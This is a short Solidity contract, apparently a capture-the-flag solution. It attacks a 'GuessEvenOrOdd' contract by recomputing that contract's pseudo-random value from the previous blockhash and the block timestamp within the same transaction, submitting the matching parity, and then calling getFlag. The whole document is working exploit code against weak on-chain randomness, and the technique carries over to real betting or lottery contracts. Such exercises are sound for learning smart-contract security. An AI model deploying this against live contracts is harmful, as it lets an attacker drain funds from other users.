pragma solidity ^0.8.0;

interface IGuessEvenOrOdd {
    function evenOdd(uint256 _yourChoice) external;
    function getFlag() external returns (string memory);
}

contract PredictAndGuess {
    IGuessEvenOrOdd public guessEvenOrOddContract;

    constructor(address _guessEvenOrOddContractAddress) {
        guessEvenOrOddContract = IGuessEvenOrOdd(_guessEvenOrOddContractAddress);
    }

    function predictAndGuess() public {
        uint256 answer = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        uint256 answerParity = answer % 2;

        guessEvenOrOddContract.evenOdd(answerParity);
    }

    function getFlagFromContract() public returns (string memory) {
        return guessEvenOrOddContract.getFlag();
     }
    }

